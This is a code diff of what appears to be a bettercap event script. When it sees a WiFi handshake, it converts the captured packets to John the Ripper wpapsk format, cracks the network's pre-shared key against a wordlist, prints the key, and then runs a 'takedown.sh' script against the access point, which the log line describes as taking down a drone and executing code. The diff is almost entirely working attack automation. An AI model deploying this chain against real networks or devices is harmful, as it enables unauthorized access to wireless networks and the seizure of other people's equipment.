@@ -85,27 +85,31 @@ onEvent('wifi.client.handshake', function(event){
 
         var cmd;
 
-        log('🪄 Converting packets to hashcat 22000 format');
         //TODO: filter on ap mac address, if possible
-        cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' -all' + ' ' + handshakesFileName;
-        log_debug('Command: ' + cmd);
+        //log('🪄 Converting packets to hashcat 22000 format');
+        //cmd = hcxpcapngtool + ' -o ' + hashcatFormat22000FileName + ' ' + handshakesFileName;
+        log('🪄 Converting packets to JtR wpapsk format');
+        cmd = hcxpcapngtool + ' --john ' + johnWPApskFileName + ' ' + handshakesFileName; //TODO: Add &> /dev/null?
+        log('Command: ' + cmd);
         run('!'+cmd);
+
+        //log('Sleeping...');
+        //run('!sleep 10');
 
         log('🪅 Cracking hashes, stand by...');
-        cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 3 -a 3 -m 22000 -w' + wordlistFileName +
-            ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName;
-        log_debug('Command: ' + cmd);
+        //cmd = 'cd ' + hashcatHomePath + ' && ' + hashcat + ' -m 22000 -a 0' +
+        //    ' -o ' + hashcatOutputFileName + ' ' + hashcatFormat22000FileName + ' ' +  wordlistFileName;
+        cmd = john + ' ' + johnWPApskFileName + ' --format=wpapsk --wordlist=' + wordlistFileName;
+        log('Command: ' + cmd);
         run('!'+cmd);
 
-        var key;
-        //TODO: Monitor output file
-
-        log('🔑 Found: '+ key);
-        cmd = 'associate with ap';
+        //TODO: Monitor output file?
+        log('🔑 Found Pre-Shared Key (PSK):');
+        cmd = john + ' ' + johnWPApskFileName + ' --show | head -1 | cut -d : -f 2';
         run('!'+cmd);
 
-        log('💎 Taking down 🚁 and executing code');
-        cmd = 'go ...';
+        log('💎 Taking down 🚁 and executing golang code');
+        cmd = 'sh takedown.sh ' + data.ap.hostname + ' ' + johnWPApskFileName;
         run('!'+cmd);
     }
 });
